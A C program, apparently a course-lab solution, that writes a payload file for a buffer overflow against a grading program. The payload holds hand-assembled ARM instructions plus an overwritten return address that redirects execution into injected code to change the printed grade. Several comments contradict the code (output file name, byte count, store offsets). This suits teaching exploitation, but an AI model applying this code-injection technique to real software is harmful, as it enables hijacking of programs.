/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Ishaan Javali and Jack Zhang                               */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"


/* 
main does not receive any parameters or input from stdin or 
other streams. It does not write to stdout. It uses fprintf 
to write 56 bytes to a file called dataA and returns 0.
 */
int main() {
    FILE *psFile;
    unsigned int movInstr, movAddr;
    unsigned int movChar1, movChar2, movChar3, movChar4, movChar5;
    unsigned int strInstr1;
    unsigned int strOffset1, strOffset2, strOffset3, strOffset4;
    unsigned int strbInstr, adrInstr, bInstr;
    psFile = fopen("dataAplus", "w");
    
    /* 4 filler bytes */
    fprintf(psFile, "I&J");
    fprintf(psFile, "%c", '\0'); 

    /* register 1 contains the 4 characters to be written 
    to the memory address stored in register 0 */

    /* 0x400960 is the memory address of the 
    "%c is your grade.\n" string in .rodata */
    /* mov w0, 0x400960 */
    movAddr = MiniAssembler_mov(0, 0x400960);
    /* move groups of 4 characters into register 1.
    then store register 1's contents into the address
    in x0 offset by an amount */
    /* mov w1, 0x25632b20 */
    movChar1 = MiniAssembler_mov(1, 0x25632b20);
    strInstr1 = MiniAssembler_strb(1, 0);
    /* mov w1, 0x69732079 */
    movChar2 = MiniAssembler_mov(1, 0x69732079);
    strOffset1 = MiniAssembler_strb(1, 0);
    /* mov w1, 0x6f757220 */
    movChar3 = MiniAssembler_mov(1, 0x6f757220);
    strOffset2 = MiniAssembler_strb(1, 0);
    /* mov w1, 0x67726164 */
    /* movChar4 = MiniAssembler_mov(1, 0x67726164);
    strOffset3 = MiniAssembler_str(1, 0, 12); */
    /* mov w1, 0x652e0a00 */
    /* movChar5 = MiniAssembler_mov(1, 0x652e0a00);
    strOffset4 = MiniAssembler_str(1, 0, 16); */

    movInstr = MiniAssembler_mov(0, 'A');
    adrInstr = MiniAssembler_adr(1, 0x420044, 0x42006C);
    strbInstr = MiniAssembler_strb(0, 1);
    bInstr = MiniAssembler_b(0x400864, 0x420080);



    /* Write machine code instructions. Total 16 bytes. */
    fwrite(&movAddr, sizeof(unsigned int), 1, psFile);
    fwrite(&movChar1, sizeof(unsigned int), 1, psFile);
    fwrite(&strInstr1, sizeof(unsigned int), 1, psFile);
    fwrite(&movChar2, sizeof(unsigned int), 1, psFile);
    fwrite(&strOffset1, sizeof(unsigned int), 1, psFile);
    fwrite(&movChar3, sizeof(unsigned int), 1, psFile);
    fwrite(&strOffset2, sizeof(unsigned int), 1, psFile);
    fwrite(&movInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&adrInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&strbInstr, sizeof(unsigned int), 1, psFile);
    fwrite(&bInstr, sizeof(unsigned int), 1, psFile);



    /* We want to replace getName's return address
     with 0x420068 (address in BSS section where 
     machine code instructions begin*/
    fprintf(psFile, "%c", 0x5C);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x42);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);
    fprintf(psFile, "%c", 0x00);

    /* Close the file */
    fclose(psFile);
    return 0;
}